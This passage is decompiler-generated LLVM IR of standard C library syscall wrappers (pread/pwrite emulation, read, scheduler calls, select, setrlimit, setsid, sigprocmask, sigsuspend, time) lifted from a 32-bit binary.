  %v5_805ae03 = call i32 @__fake_pread_write64(i32 %v0_805addc, i32 %v0_805addb, i32 %arg4, i32 %arg5, i32 0)
  ret i32 %v5_805ae03

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32, i32)* @__fake_pread_write64, { 1, 0 }
}

define i32 @__fake_pread_write(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %v0_805ae08 = load i32, i32* @ebp, align 4
  %v0_805ae0a = load i32, i32* @esi, align 4
  %v0_805ae0f = load i32, i32* @eax, align 4
  store i32 %v0_805ae0f, i32* @edi, align 4
  %v0_805ae11 = load i32, i32* @edx, align 4
  store i32 %v0_805ae11, i32* @esi, align 4
  %v0_805ae13 = load i32, i32* @ecx, align 4
  store i32 %v0_805ae13, i32* @ebx, align 4
  store i32 %v0_805ae0f, i32* %stack_var_-44, align 4
  %v3_805ae1a = call i32 @__GI___libc_lseek(i32 %v0_805ae0f, i32 0, i32 1)
  %v13_805ae26 = icmp eq i32 %v3_805ae1a, -1
  br i1 %v13_805ae26, label %dec_label_pc_805ae85, label %dec_label_pc_805ae2d

dec_label_pc_805ae2d:                             ; preds = %entry
  %v0_805ae34 = load i32, i32* @edi, align 4
  store i32 %v0_805ae34, i32* %stack_var_-44, align 4
  %v3_805ae35 = call i32 @__GI___libc_lseek(i32 %v0_805ae34, i32 %arg1, i32 0)
  %v8_805ae3d = icmp eq i32 %v3_805ae35, -1
  br i1 %v8_805ae3d, label %dec_label_pc_805ae85, label %dec_label_pc_805ae40

dec_label_pc_805ae40:                             ; preds = %dec_label_pc_805ae2d
  %v12_805ae40 = icmp eq i32 %arg2, 1
  %v1_805ae45 = icmp eq i1 %v12_805ae40, false
  %v0_805ae53 = load i32, i32* @ebx, align 4
  %v0_805ae54 = load i32, i32* @esi, align 4
  %v0_805ae55 = load i32, i32* @edi, align 4
  store i32 %v0_805ae55, i32* %stack_var_-44, align 4
  br i1 %v1_805ae45, label %dec_label_pc_805ae52, label %dec_label_pc_805ae47

dec_label_pc_805ae47:                             ; preds = %dec_label_pc_805ae40
  %v3_805ae4b = call i32 @__libc_write(i32 %v0_805ae55, i32 %v0_805ae54, i32 %v0_805ae53)
  br label %dec_label_pc_805ae5b

dec_label_pc_805ae52:                             ; preds = %dec_label_pc_805ae40
  %v3_805ae56 = call i32 @__libc_read(i32 %v0_805ae55, i32 %v0_805ae54, i32 %v0_805ae53)
  br label %dec_label_pc_805ae5b

dec_label_pc_805ae5b:                             ; preds = %dec_label_pc_805ae47, %dec_label_pc_805ae52
  %storemerge = phi i32 [ %v3_805ae56, %dec_label_pc_805ae52 ], [ %v3_805ae4b, %dec_label_pc_805ae47 ]
  store i32 %storemerge, i32* @esi, align 4
  %v0_805ae60 = load i32, i32* %stack_var_-44, align 4
  %v1_805ae60 = call i32 @__errno_location(i32 %v0_805ae60)
  store i32 %v1_805ae60, i32* @ebx, align 4
  %v1_805ae67 = inttoptr i32 %v1_805ae60 to i32*
  %v2_805ae67 = load i32, i32* %v1_805ae67, align 4
  store i32 %v2_805ae67, i32* @ebp, align 4
  %v0_805ae70 = load i32, i32* @edi, align 4
  store i32 %v0_805ae70, i32* %stack_var_-44, align 4
  %v3_805ae71 = call i32 @__GI___libc_lseek(i32 %v0_805ae70, i32 %v3_805ae1a, i32 0)
  %v8_805ae79 = icmp eq i32 %v3_805ae71, -1
  %v1_805ae7a = icmp eq i1 %v8_805ae79, false
  br i1 %v1_805ae7a, label %dec_label_pc_805ae81, label %dec_label_pc_805ae7c

dec_label_pc_805ae7c:                             ; preds = %dec_label_pc_805ae5b
  %v0_805ae7c = load i32, i32* @esi, align 4
  %v10_805ae7c = icmp eq i32 %v0_805ae7c, -1
  %v1_805ae7f = icmp eq i1 %v10_805ae7c, false
  br i1 %v1_805ae7f, label %dec_label_pc_805ae85, label %dec_label_pc_805ae81

dec_label_pc_805ae81:                             ; preds = %dec_label_pc_805ae7c, %dec_label_pc_805ae5b
  %v0_805ae81 = load i32, i32* @ebp, align 4
  %v1_805ae81 = load i32, i32* @ebx, align 4
  %v2_805ae81 = inttoptr i32 %v1_805ae81 to i32*
  store i32 %v0_805ae81, i32* %v2_805ae81, align 4
  %v0_805ae8b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805ae88

dec_label_pc_805ae85:                             ; preds = %dec_label_pc_805ae7c, %dec_label_pc_805ae2d, %entry
  br label %dec_label_pc_805ae88

dec_label_pc_805ae88:                             ; preds = %dec_label_pc_805ae81, %dec_label_pc_805ae85
  %v0_805ae8b = phi i32 [ %v0_805ae8b.pre, %dec_label_pc_805ae81 ], [ -1, %dec_label_pc_805ae85 ]
  store i32 %v0_805ae0a, i32* @esi, align 4
  store i32 %v0_805ae08, i32* @ebp, align 4
  ret i32 %v0_805ae8b

; uselistorder directives
  uselistorder i32 %v0_805ae55, { 1, 0, 2 }
  uselistorder i32 %v0_805ae54, { 1, 0 }
  uselistorder i32 %v0_805ae53, { 1, 0 }
  uselistorder i32 %v3_805ae1a, { 1, 0 }
  uselistorder i32 %v0_805ae0f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @__GI___libc_lseek, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_805ae88, { 1, 0 }
  uselistorder label %dec_label_pc_805ae5b, { 1, 0 }
}

define i32 @__libc_pwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_805ae92 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %arg2, i32* @edx, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v3_805aeb0 = call i32 @__fake_pread_write(i32 %v0_805ae92, i32 %arg4, i32 1)
  ret i32 %v3_805aeb0
}

define i32 @__libc_pread(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_805aeb5 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %arg2, i32* @edx, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v3_805aed3 = call i32 @__fake_pread_write(i32 %v0_805aeb5, i32 %arg4, i32 0)
  ret i32 %v3_805aed3

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @__fake_pread_write, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805aed8 = load i32, i32* @edi, align 4
  store i32 %v0_805aed8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v0_805aee8 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805aef0 = call i32 @read(i32 %v0_805aee8)
  store i32 %v0_805aee8, i32* @ebx, align 4
  store i32 %v1_805aef0, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805aef0, -4095
  br i1 %tmp, label %dec_label_pc_805af08, label %dec_label_pc_805aefc

dec_label_pc_805aefc:                             ; preds = %entry
  %v1_805aefc = call i32 @__errno_location(i32 %v0_805aee8)
  %v0_805af01 = load i32, i32* %edi.global-to-local, align 4
  %v1_805af01 = sub i32 0, %v0_805af01
  %v2_805af03 = inttoptr i32 %v1_805aefc to i32*
  store i32 %v1_805af01, i32* %v2_805af03, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805af08

dec_label_pc_805af08:                             ; preds = %entry, %dec_label_pc_805aefc
  %v0_805af08 = phi i32 [ %v1_805aef0, %entry ], [ -1, %dec_label_pc_805aefc ]
  %v2_805af0c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805af0c, i32* @edi, align 4
  ret i32 %v0_805af08

; uselistorder directives
  uselistorder i32 %v1_805aef0, { 1, 0, 2 }
  uselistorder i32 %v0_805aee8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805af08, { 1, 0 }
}

define i32 @sched_get_priority_max(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805af10 = load i32, i32* @edi, align 4
  store i32 %v0_805af10, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_805af18 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805af20 = call i32 @sched_get_priority_max(i32 %v0_805af18)
  store i32 %v0_805af18, i32* @ebx, align 4
  store i32 %v1_805af20, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805af20, -4095
  br i1 %tmp, label %dec_label_pc_805af38, label %dec_label_pc_805af2c

dec_label_pc_805af2c:                             ; preds = %entry
  %v1_805af2c = call i32 @__errno_location(i32 %v0_805af18)
  %v0_805af31 = load i32, i32* %edi.global-to-local, align 4
  %v1_805af31 = sub i32 0, %v0_805af31
  %v2_805af33 = inttoptr i32 %v1_805af2c to i32*
  store i32 %v1_805af31, i32* %v2_805af33, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805af38

dec_label_pc_805af38:                             ; preds = %entry, %dec_label_pc_805af2c
  %v0_805af38 = phi i32 [ %v1_805af20, %entry ], [ -1, %dec_label_pc_805af2c ]
  %v2_805af3c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805af3c, i32* @edi, align 4
  ret i32 %v0_805af38

; uselistorder directives
  uselistorder i32 %v1_805af20, { 1, 0, 2 }
  uselistorder i32 %v0_805af18, { 1, 0, 2 }
  uselistorder i32 (i32)* @sched_get_priority_max, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805af38, { 1, 0 }
}

define i32 @sched_get_priority_min(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805af40 = load i32, i32* @edi, align 4
  store i32 %v0_805af40, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_805af48 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805af50 = call i32 @sched_get_priority_min(i32 %v0_805af48)
  store i32 %v0_805af48, i32* @ebx, align 4
  store i32 %v1_805af50, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805af50, -4095
  br i1 %tmp, label %dec_label_pc_805af68, label %dec_label_pc_805af5c

dec_label_pc_805af5c:                             ; preds = %entry
  %v1_805af5c = call i32 @__errno_location(i32 %v0_805af48)
  %v0_805af61 = load i32, i32* %edi.global-to-local, align 4
  %v1_805af61 = sub i32 0, %v0_805af61
  %v2_805af63 = inttoptr i32 %v1_805af5c to i32*
  store i32 %v1_805af61, i32* %v2_805af63, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805af68

dec_label_pc_805af68:                             ; preds = %entry, %dec_label_pc_805af5c
  %v0_805af68 = phi i32 [ %v1_805af50, %entry ], [ -1, %dec_label_pc_805af5c ]
  %v2_805af6c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805af6c, i32* @edi, align 4
  ret i32 %v0_805af68

; uselistorder directives
  uselistorder i32 %v1_805af50, { 1, 0, 2 }
  uselistorder i32 %v0_805af48, { 1, 0, 2 }
  uselistorder i32 (i32)* @sched_get_priority_min, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805af68, { 1, 0 }
}

define i32 @sched_getparam(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_805af70 = load i32, i32* @ebx, align 4
  store i32 %v0_805af70, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_805af83 = call i32 @sched_getparam(i32 %v0_805af70, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_805af83, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_805af83, -4095
  br i1 %tmp, label %dec_label_pc_805af9c, label %dec_label_pc_805af90

dec_label_pc_805af90:                             ; preds = %entry
  %v0_805af90 = load i32, i32* %stack_var_-4, align 4
  %v1_805af90 = call i32 @__errno_location(i32 %v0_805af90)
  %v0_805af95 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805af95 = sub i32 0, %v0_805af95
  %v2_805af97 = inttoptr i32 %v1_805af90 to i32*
  store i32 %v1_805af95, i32* %v2_805af97, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805af9c

dec_label_pc_805af9c:                             ; preds = %entry, %dec_label_pc_805af90
  %v0_805af9c = phi i32 [ %v4_805af83, %entry ], [ -1, %dec_label_pc_805af90 ]
  %v2_805afa0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805afa0, i32* @ebx, align 4
  ret i32 %v0_805af9c

; uselistorder directives
  uselistorder i32 %v4_805af83, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @sched_getparam, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805af9c, { 1, 0 }
}

define i32 @sched_getscheduler(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805afa4 = load i32, i32* @edi, align 4
  store i32 %v0_805afa4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_805afac = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805afb4 = call i32 @sched_getscheduler(i32 %v0_805afac)
  store i32 %v0_805afac, i32* @ebx, align 4
  store i32 %v1_805afb4, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805afb4, -4095
  br i1 %tmp, label %dec_label_pc_805afcc, label %dec_label_pc_805afc0

dec_label_pc_805afc0:                             ; preds = %entry
  %v1_805afc0 = call i32 @__errno_location(i32 %v0_805afac)
  %v0_805afc5 = load i32, i32* %edi.global-to-local, align 4
  %v1_805afc5 = sub i32 0, %v0_805afc5
  %v2_805afc7 = inttoptr i32 %v1_805afc0 to i32*
  store i32 %v1_805afc5, i32* %v2_805afc7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805afcc

dec_label_pc_805afcc:                             ; preds = %entry, %dec_label_pc_805afc0
  %v0_805afcc = phi i32 [ %v1_805afb4, %entry ], [ -1, %dec_label_pc_805afc0 ]
  %v2_805afd0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805afd0, i32* @edi, align 4
  ret i32 %v0_805afcc

; uselistorder directives
  uselistorder i32 %v1_805afb4, { 1, 0, 2 }
  uselistorder i32 %v0_805afac, { 1, 0, 2 }
  uselistorder i32 (i32)* @sched_getscheduler, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805afcc, { 1, 0 }
}

define i32 @sched_setscheduler(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp8, i32* %stack_var_-12, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805afd4 = load i32, i32* @edi, align 4
  store i32 %v0_805afd4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_805afe4 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_805afec = call i32 @sched_setscheduler(i32 %v0_805afe4, i32 %tmp8, i32 %tmp6)
  store i32 %v0_805afe4, i32* @ebx, align 4
  store i32 %v3_805afec, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v3_805afec, -4095
  br i1 %tmp, label %dec_label_pc_805b004, label %dec_label_pc_805aff8

dec_label_pc_805aff8:                             ; preds = %entry
  %v1_805aff8 = call i32 @__errno_location(i32 %v0_805afe4)
  %v0_805affd = load i32, i32* %edi.global-to-local, align 4
  %v1_805affd = sub i32 0, %v0_805affd
  %v2_805afff = inttoptr i32 %v1_805aff8 to i32*
  store i32 %v1_805affd, i32* %v2_805afff, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805b004

dec_label_pc_805b004:                             ; preds = %entry, %dec_label_pc_805aff8
  %v0_805b004 = phi i32 [ %v3_805afec, %entry ], [ -1, %dec_label_pc_805aff8 ]
  %v2_805b006 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805b006, i32* @edx, align 4
  %v2_805b008 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805b008, i32* @edi, align 4
  ret i32 %v0_805b004

; uselistorder directives
  uselistorder i32 %v3_805afec, { 1, 0, 2 }
  uselistorder i32 %v0_805afe4, { 1, 0, 2 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sched_setscheduler, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_805b004, { 1, 0 }
}

define i32 @sched_yield(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805b00c = load i32, i32* @ebx, align 4
  store i32 %v0_805b00c, i32* %stack_var_-4, align 4
  %v1_805b015 = call i32 @sched_yield(i32 %v0_805b00c)
  store i32 %v1_805b015, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805b015, -4095
  br i1 %tmp, label %dec_label_pc_805b02c, label %dec_label_pc_805b020

dec_label_pc_805b020:                             ; preds = %entry
  %v0_805b020 = load i32, i32* %stack_var_-4, align 4
  %v1_805b020 = call i32 @__errno_location(i32 %v0_805b020)
  %v0_805b025 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805b025 = sub i32 0, %v0_805b025
  %v2_805b027 = inttoptr i32 %v1_805b020 to i32*
  store i32 %v1_805b025, i32* %v2_805b027, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805b02c

dec_label_pc_805b02c:                             ; preds = %entry, %dec_label_pc_805b020
  %v0_805b02c = phi i32 [ %v1_805b015, %entry ], [ -1, %dec_label_pc_805b020 ]
  %v2_805b030 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805b030, i32* @ebx, align 4
  ret i32 %v0_805b02c

; uselistorder directives
  uselistorder i32 %v1_805b015, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32)* @sched_yield, { 1, 0 }
  uselistorder label %dec_label_pc_805b02c, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805b035 = load i32, i32* @esi, align 4
  store i32 %v0_805b035, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_805b04d = load i32, i32* @ebx, align 4
  %v1_805b055 = call i32 @int80_syscall(i32 142)
  store i32 %v0_805b04d, i32* @ebx, align 4
  store i32 %v1_805b055, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805b055, -4095
  br i1 %tmp, label %dec_label_pc_805b06d, label %dec_label_pc_805b061

dec_label_pc_805b061:                             ; preds = %entry
  %v1_805b061 = call i32 @__errno_location(i32 %v0_805b04d)
  %v0_805b066 = load i32, i32* %esi.global-to-local, align 4
  %v1_805b066 = sub i32 0, %v0_805b066
  %v2_805b068 = inttoptr i32 %v1_805b061 to i32*
  store i32 %v1_805b066, i32* %v2_805b068, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805b06d

dec_label_pc_805b06d:                             ; preds = %entry, %dec_label_pc_805b061
  %v0_805b06d = phi i32 [ %v1_805b055, %entry ], [ -1, %dec_label_pc_805b061 ]
  %v2_805b06f = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805b06f, i32* @edx, align 4
  %v2_805b070 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805b070, i32* @esi, align 4
  ret i32 %v0_805b06d

; uselistorder directives
  uselistorder i32 %v1_805b055, { 1, 0, 2 }
  uselistorder i32 %v0_805b04d, { 1, 0 }
  uselistorder label %dec_label_pc_805b06d, { 1, 0 }
}

define i32 @__GI_setrlimit(i32 %arg1, %rlimit* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805b074 = load i32, i32* @ebx, align 4
  store i32 %v0_805b074, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_805b087 = call i32 @setrlimit(i32 %arg1, %rlimit* %arg2)
  store i32 %v4_805b087, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_805b087, -4095
  br i1 %tmp, label %dec_label_pc_805b0a0, label %dec_label_pc_805b094

dec_label_pc_805b094:                             ; preds = %entry
  %v0_805b094 = load i32, i32* %stack_var_-4, align 4
  %v1_805b094 = call i32 @__errno_location(i32 %v0_805b094)
  %v0_805b099 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805b099 = sub i32 0, %v0_805b099
  %v2_805b09b = inttoptr i32 %v1_805b094 to i32*
  store i32 %v1_805b099, i32* %v2_805b09b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805b0a0

dec_label_pc_805b0a0:                             ; preds = %entry, %dec_label_pc_805b094
  %v0_805b0a0 = phi i32 [ %v4_805b087, %entry ], [ -1, %dec_label_pc_805b094 ]
  %v2_805b0a4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805b0a4, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805b0a0

; uselistorder directives
  uselistorder i32 %v4_805b087, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805b0a0, { 1, 0 }
}

define i32 @__GI_setsid(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805b0a8 = load i32, i32* @ebx, align 4
  store i32 %v0_805b0a8, i32* %stack_var_-4, align 4
  %v1_805b0b1 = call i32 @setsid(i32 %v0_805b0a8)
  store i32 %v1_805b0b1, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805b0b1, -4095
  br i1 %tmp, label %dec_label_pc_805b0c8, label %dec_label_pc_805b0bc

dec_label_pc_805b0bc:                             ; preds = %entry
  %v0_805b0bc = load i32, i32* %stack_var_-4, align 4
  %v1_805b0bc = call i32 @__errno_location(i32 %v0_805b0bc)
  %v0_805b0c1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805b0c1 = sub i32 0, %v0_805b0c1
  %v2_805b0c3 = inttoptr i32 %v1_805b0bc to i32*
  store i32 %v1_805b0c1, i32* %v2_805b0c3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805b0c8

dec_label_pc_805b0c8:                             ; preds = %entry, %dec_label_pc_805b0bc
  %v0_805b0c8 = phi i32 [ %v1_805b0b1, %entry ], [ -1, %dec_label_pc_805b0bc ]
  %v2_805b0ca = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805b0ca, i32* @edx, align 4
  %v2_805b0cc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805b0cc, i32* @ebx, align 4
  ret i32 %v0_805b0c8

; uselistorder directives
  uselistorder i32 %v1_805b0b1, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805b0c8, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_805b0d1 = load i32, i32* @esi, align 4
  %v4_805b0d5 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_805b0d5, i32* @ecx, align 4
  %v2_805b0e1 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_805b0e1, label %dec_label_pc_805b0fa, label %dec_label_pc_805b0e5

dec_label_pc_805b0e5:                             ; preds = %entry
  %tmp11 = icmp ult i32 %arg1, 3
  br i1 %tmp11, label %dec_label_pc_805b0fa, label %dec_label_pc_805b0ea

dec_label_pc_805b0ea:                             ; preds = %dec_label_pc_805b0e5
  %v1_805b0ea = call i32 @__errno_location(i32 %v0_805b0d1)
  %v1_805b0ef = inttoptr i32 %v1_805b0ea to i32*
  store i32 22, i32* %v1_805b0ef, align 4
  br label %dec_label_pc_805b121

dec_label_pc_805b0fa:                             ; preds = %dec_label_pc_805b0e5, %entry
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_805b0ff = load i32, i32* @ebx, align 4
  %v7_805b107 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_805b0ff, i32* @ebx, align 4
  store i32 %v7_805b107, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v7_805b107, -4095
  br i1 %tmp, label %dec_label_pc_805b121, label %dec_label_pc_805b113

dec_label_pc_805b113:                             ; preds = %dec_label_pc_805b0fa
  %v1_805b113 = call i32 @__errno_location(i32 %v0_805b0ff)
  %v0_805b118 = load i32, i32* %esi.global-to-local, align 4
  %v1_805b118 = sub i32 0, %v0_805b118
  %v2_805b11a = inttoptr i32 %v1_805b113 to i32*
  store i32 %v1_805b118, i32* %v2_805b11a, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805b121

dec_label_pc_805b121:                             ; preds = %dec_label_pc_805b113, %dec_label_pc_805b0fa, %dec_label_pc_805b0ea
  %storemerge = phi i32 [ -1, %dec_label_pc_805b0ea ], [ %v7_805b107, %dec_label_pc_805b0fa ], [ -1, %dec_label_pc_805b113 ]
  %v2_805b121 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805b121, i32* @edx, align 4
  store i32 %v0_805b0d1, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_805b107, { 1, 0, 2 }
  uselistorder i32 %v0_805b0ff, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__libc_sigsuspend(%_TYPEDEF_sigset_t* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805b128 = load i32, i32* @ebx, align 4
  store i32 %v0_805b128, i32* %stack_var_-4, align 4
  %v4_805b131 = ptrtoint %_TYPEDEF_sigset_t* %arg1 to i32
  store i32 %v4_805b131, i32* %ebx.global-to-local, align 4
  %v3_805b13c = call i32 @sigsuspend(%_TYPEDEF_sigset_t* %arg1)
  store i32 %v3_805b13c, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v3_805b13c, -4095
  br i1 %tmp, label %dec_label_pc_805b155, label %dec_label_pc_805b149

dec_label_pc_805b149:                             ; preds = %entry
  %v0_805b149 = load i32, i32* %stack_var_-4, align 4
  %v1_805b149 = call i32 @__errno_location(i32 %v0_805b149)
  %v0_805b14e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805b14e = sub i32 0, %v0_805b14e
  %v2_805b150 = inttoptr i32 %v1_805b149 to i32*
  store i32 %v1_805b14e, i32* %v2_805b150, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805b155

dec_label_pc_805b155:                             ; preds = %entry, %dec_label_pc_805b149
  %v0_805b155 = phi i32 [ %v3_805b13c, %entry ], [ -1, %dec_label_pc_805b149 ]
  %v2_805b157 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805b157, i32* @edx, align 4
  %v2_805b159 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805b159, i32* @ebx, align 4
  ret i32 %v0_805b155

; uselistorder directives
  uselistorder i32 %v3_805b13c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder %_TYPEDEF_sigset_t* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805b155, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805b15c = load i32, i32* @edi, align 4
  store i32 %v0_805b15c, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_805b164 = load i32, i32* @ebx, align 4
  %v2_805b16c = call i32 @time(i32* %arg1)
  store i32 %v0_805b164, i32* @ebx, align 4
